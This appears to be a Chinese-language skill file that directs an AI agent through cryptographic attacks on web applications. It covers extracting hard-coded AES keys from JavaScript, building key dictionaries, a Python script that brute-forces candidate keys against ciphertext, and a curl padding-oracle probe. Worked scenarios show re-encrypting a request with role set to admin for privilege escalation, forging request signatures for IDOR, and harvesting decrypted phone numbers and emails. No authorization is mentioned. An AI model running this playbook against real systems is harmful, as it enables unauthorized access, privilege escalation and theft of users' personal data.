---
name: crypto-attack
description: >
  ★ AI 优势赛道 — 加密算法识别、密钥提取与破解。覆盖 AES (CBC/ECB/GCM)、
  DES/3DES、RSA、Base64/Hex/MD5/SHA 编码检测、CryptoJS 模式提取、
  响应体加密绕过、自定义混淆逆向、JWT+AES 双重加密场景。
metadata:
  tags: "crypto,aes,des,rsa,base64,md5,sha,encoding,decrypt,cryptojs"
  category: "offensive-security"
  ai_advantage: true
---

# Crypto Attack — 加密/编码识别与破解

> AI 在模式识别、编码检测、密钥空间构建上有天然优势。
> 这个 skill 把加解密变成系统化流程。

## 0. 为什么 AI 在这块有优势

```
人类: 看到一个 Base64 字符串 → 肉眼判断是否加密 → 猜算法 → 手动试
AI:   扫描全量响应/JS → 模式匹配所有疑似加密体 → 自动分类 →
      从 JS 提取加密函数签名 → 构建密钥字典 → 批量尝试

AI 能做的事:
  1. 从 100 个 JS 文件中秒级提取所有 CryptoJS/Crypto 相关调用
  2. 自动识别 Base64/Hex 是传输编码还是加密后的编码
  3. 构建"JS 提取字面量 + 公共字典 + 目标特征"的三层密钥字典
  4. 批量解密响应体中的加密字段 → 数据联动回注
```

---

## 1. 加密体发现 (MANDATORY)

### 1a. 响应体中的疑似加密字段

```python
# 疑似加密体检测规则
ENCRYPTION_PATTERNS = [
    # Base64 (AES/DES 加密后常见)
    (r'^[A-Za-z0-9+/]{32,}={0,2}$', 'base64_candidate'),
    (r'^[A-Za-z0-9+/]{64,}={0,2}$', 'base64_long'),
    # Hex
    (r'^[0-9A-Fa-f]{32,}$', 'hex_candidate'),
    # 混合格式
    (r'^[A-Za-z0-9+/=]{16,}$', 'b64_or_encoded'),
]

# 可疑字段名
SUSPICIOUS_FIELD_NAMES = [
    'encrypt', 'cipher', 'secureData', 'payload',
    'data', 'content', 'body', 'sign', 'signature',
    'hash', 'digest', 'checksum', 'mac', 'hmac',
    'token', 'accessToken', 'refreshToken', 'auth',
    'p', 'q', 'k', 'v', 's', 't',  # 单字母缩写
]
```

### 1b. JS 文件中的加密函数调用

```javascript
// 搜索这些模式 → 确定使用的加密库和算法

// CryptoJS (最常见)
CryptoJS.AES.encrypt(
CryptoJS.AES.decrypt(
CryptoJS.DES.encrypt(
CryptoJS.TripleDES.encrypt(
CryptoJS.RC4.encrypt(
CryptoJS.Rabbit.encrypt(
CryptoJS.MD5(
CryptoJS.SHA1(
CryptoJS.SHA256(
CryptoJS.HmacSHA256(
CryptoJS.enc.Base64.stringify(
CryptoJS.enc.Hex.parse(
CryptoJS.enc.Utf8.parse(
CryptoJS.mode.CBC
CryptoJS.mode.ECB
CryptoJS.pad.Pkcs7

// Node.js crypto
crypto.createCipheriv(
crypto.createDecipheriv(
crypto.createHash(
crypto.createHmac(
crypto.pbkdf2(
crypto.randomBytes(

// Web Crypto API
crypto.subtle.encrypt(
crypto.subtle.decrypt(
crypto.subtle.importKey(
crypto.subtle.generateKey(

// Forge
forge.cipher.createCipher(
forge.md.sha256.create(
forge.pki.rsa.encrypt(

// JSEncrypt (RSA)
new JSEncrypt()
jsencrypt.encrypt(
jsencrypt.setPublicKey(

// sm-crypto (国密)
sm2.doEncrypt(
sm4.encrypt(
```

---

## 2. AES 攻击链

### 2a. 从 JS 提取 AES 密钥和 IV

```javascript
// 搜索模式 → 提取密钥
// Pattern 1: 直接硬编码
var key = CryptoJS.enc.Utf8.parse("1234567890123456");
var iv = CryptoJS.enc.Utf8.parse("1234567890123456");
// → 提取: key="1234567890123456" (16字节 = AES-128)

// Pattern 2: 从字符串生成
var key = CryptoJS.enc.Utf8.parse(secretKey);
// → 搜索 secretKey 的来源

// Pattern 3: MD5 派生
var key = CryptoJS.MD5(password);
// → 搜索 password 的来源

// Pattern 4: PBKDF2 派生
var key = CryptoJS.PBKDF2(password, salt, {keySize: 256/32});
// → 搜索 password 和 salt

// Pattern 5: Base64 解码后作为密钥
var key = CryptoJS.enc.Base64.parse(encodedKey);
// → 提取 encodedKey, base64 解码即得密钥

// Pattern 6: 从服务器响应获取
var key = response.data.secret;
// → 数据联动: 响应体的某个字段 = 加密密钥
```

### 2b. AES 密钥字典构建

```bash
# 层级 1: JS 提取的所有字面量字符串 (最优先)
grep -roP '"[^"]{8,64}"' output/*/js/*.js | sort -u > js_literals.txt

# 层级 2: 响应体中的敏感字段值 (从 data_linkage 阶段)
cat findings/_leaked_values.json | jq -r '.[].values[]' > leaked_values.txt

# 层级 3: AES 常见弱密钥
cat > aes_common_keys.txt << EOF
1234567890123456
1234567890abcdef
0000000000000000
abcdefghijklmnop
!@#$%^&*()_+QWER
thisisasecretkey
EOF

# 合并去重
cat js_literals.txt leaked_values.txt aes_common_keys.txt | sort -u > aes_dict.txt
```

### 2c. AES 模式识别

```python
# 从 JS 代码中识别 AES 模式
def detect_aes_mode(js_code):
    if 'CryptoJS.mode.CBC' in js_code or 'aes-256-cbc' in js_code:
        return 'CBC'
    if 'CryptoJS.mode.ECB' in js_code or 'aes-256-ecb' in js_code:
        return 'ECB'
    if 'CryptoJS.mode.CTR' in js_code or 'aes-256-ctr' in js_code:
        return 'CTR'
    if 'CryptoJS.mode.GCM' in js_code or 'aes-256-gcm' in js_code:
        return 'GCM'
    if 'CryptoJS.mode.OFB' in js_code:
        return 'OFB'
    if 'CryptoJS.mode.CFB' in js_code:
        return 'CFB'
    # 默认假设 CBC (最常见)
    return 'CBC'
```

### 2d. ECB 模式特征检测（无需密钥）

ECB 模式下相同的明文块产生相同的密文块。如果加密体中出现重复的 16 字节块 → ECB 模式!

```python
def detect_ecb(ciphertext_hex, block_size=16):
    """检测 ECB 模式: 查找重复的密文块"""
    blocks = [ciphertext_hex[i:i+block_size*2] 
              for i in range(0, len(ciphertext_hex), block_size*2)]
    unique = len(set(blocks))
    total = len(blocks)
    if unique < total:
        return True, f"ECB detected: {total - unique} duplicate blocks"
    return False, "No ECB pattern detected"
```

### 2e. Padding Oracle 检测

```bash
# 如果应用解密失败时返回不同错误 → Padding Oracle 漏洞
# 测试: 修改密文最后一字节 → 观察响应差异

# 正常请求
curl -s https://target/api/decrypt -d '{"data":"<ciphertext>"}'
# → {"status":"success","data":"..."}

# 篡改最后一字节
curl -s https://target/api/decrypt -d '{"data":"<tampered_ciphertext>"}'
# → {"status":"error","msg":"decryption failed"}  ← 如果错误信息不同 → 疑似 Padding Oracle
```

---

## 3. 编码检测与处理

### 3a. 自动识别编码类型

```python
import re, base64, binascii

def identify_encoding(data_str):
    """自动识别字符串的编码类型"""
    
    # Base64
    if re.match(r'^[A-Za-z0-9+/]+={0,2}$', data_str) and len(data_str) % 4 == 0:
        try:
            decoded = base64.b64decode(data_str)
            if all(32 <= b < 127 or b in (9,10,13) for b in decoded):
                return 'base64', decoded
        except: pass
    
    # URL-safe Base64
    if re.match(r'^[A-Za-z0-9_-]+={0,2}$', data_str):
        try:
            decoded = base64.urlsafe_b64decode(data_str + '==')
            return 'base64_urlsafe', decoded
        except: pass
    
    # Hex
    if re.match(r'^[0-9A-Fa-f]+$', data_str) and len(data_str) % 2 == 0:
        try:
            decoded = bytes.fromhex(data_str)
            return 'hex', decoded
        except: pass
    
    # JWT (特殊处理)
    if data_str.startswith('eyJ') and data_str.count('.') == 2:
        return 'jwt', data_str
    
    return 'unknown', data_str
```

### 3b. 多层编码检测

```python
def detect_layers(data_str, max_depth=5):
    """递归检测多层编码 (如 Base64→Base64→JSON)"""
    layers = []
    current = data_str
    
    for _ in range(max_depth):
        encoding, decoded = identify_encoding(current)
        if encoding == 'unknown':
            break
        layers.append(encoding)
        current = decoded if isinstance(decoded, bytes) else decoded.encode()
        
        # 如果解码后是可读文本/JSON → 停止
        try:
            decoded_str = current.decode() if isinstance(current, bytes) else current
            if decoded_str.startswith('{') or decoded_str.startswith('['):
                layers.append('json')
                break
            if all(32 <= ord(c) < 127 for c in decoded_str[:50]):
                layers.append('plaintext')
                break
        except: pass
    
    return layers
# 例: "eyJ..." → ['jwt']
#     "V2tjM..." → ['base64', 'json']
#     "N2Yz..." → ['hex', 'base64', 'json']  ← 三层!
```

---

## 4. 实际攻击场景

### 场景 1: 请求体 AES 加密 — 篡改测试

```
POST /api/user/update  → 请求体: {"data":"U2FsdGVkX18..."}
                              ↑ CryptoJS.AES.encrypt(JSON.stringify(payload), key)

Step 1: 从 JS 找到: var key = CryptoJS.enc.Utf8.parse("siteSpecificKey!");
Step 2: 解密 "U2FsdGVkX18..." → {"userId":10086,"role":"user"}
Step 3: 修改 role→admin → 重新加密 → 发送
Step 4: 提权成功 → critical finding
```

### 场景 2: 响应体加密字段 — 数据挖掘

```
GET /api/user/list  → [{"id":1,"name":"admin","data":"x9Kd..."}]
                               ↑ 加密字段, 可能含敏感信息

Step 1: 从 JS 找到解密逻辑: JSON.parse(CryptoJS.AES.decrypt(data, key).toString(CryptoJS.enc.Utf8))
Step 2: 提取 key → 解密 "x9Kd..." → {"phone":"138...","email":"admin@..."}
Step 3: 电话/邮箱用于其他接口的参数注入 → 数据联动
```

### 场景 3: 签名算法逆向 — 参数篡改

```
GET /api/order/list?userId=10086&sign=a3f8c2d...

Step 1: 从 JS 找签名生成: md5(params + timestamp + secret)
Step 2: 提取 secret → 可自行计算任意参数的合法签名
Step 3: userId=10087&sign=<computed> → IDOR + 签名绕过
```

### 场景 4: 自定义编码/混淆

```javascript
// 常见自定义混淆模式
function encode(str) {
    return btoa(str.split('').reverse().join(''));  // 反转 + Base64
}

function customDecode(str) {
    return atob(str).split('').reverse().join('');
}
// 这种自定义逻辑在 JS 中很容易被 AI 识别和复现
```

---

## 5. 工具链

```bash
# Python 解密工具
python3 -c "
from Crypto.Cipher import AES
import base64, json

key = b'1234567890123456'
ciphertext = base64.b64decode('U2FsdGVkX18...')
cipher = AES.new(key, AES.MODE_CBC, iv=ciphertext[:16])
plaintext = cipher.decrypt(ciphertext[16:])
print(plaintext)
"

# 批量 AES 密钥尝试
python3 -c "
from Crypto.Cipher import AES
import base64

ciphertext = base64.b64decode('<ENCRYPTED_DATA>')
with open('aes_dict.txt') as f:
    for key_str in f:
        key_str = key_str.strip()
        try:
            key = key_str.encode().ljust(16, b'\x00')[:16]
            cipher = AES.new(key, AES.MODE_ECB)
            plain = cipher.decrypt(ciphertext)
            if b'{\"' in plain:  # 看起来像 JSON
                print(f'FOUND KEY: {key_str}')
                print(f'PLAIN: {plain}')
                break
        except: pass
"
```

---

## 6. 与其他阶段的联动

```
Phase 1 (JS 分析) → 提取加密函数签名和密钥字面量
Phase 4 (API Fuzz) → 发现加密的请求/响应体
Phase 5 (Crypto)   → 解密 → 提取明文数据
    │
    ├── 解密出的新参数名 → 回注到 Phase 4 API Fuzz
    ├── 解密出的凭据/JWT → 回注到 Phase 5 JWT Attack
    ├── 解密出的用户 ID → 回注到 Phase 7 IDOR
    └── 解密出的密钥本身 → 加入字典 → 对其他加密体尝试
```
